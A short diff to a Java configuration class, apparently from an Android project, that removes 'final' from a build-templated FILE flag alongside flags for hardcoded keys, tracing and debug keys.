@@ -26,7 +26,7 @@ public class Cfg {
 	
 	public static final boolean KEYS = @KEYS@; // Se e' true vengono usate le chiavi hardcoded
 	
-	public static final boolean FILE = @FILE@;
+	public static boolean FILE = @FILE@;
 	public static final boolean MICFILE = false;
 	public static final boolean TRACE = false; // enable Debug.startMethodTracing
 	public static final boolean DEBUGKEYS = false; //uses fake keys if assets/r.bin not available
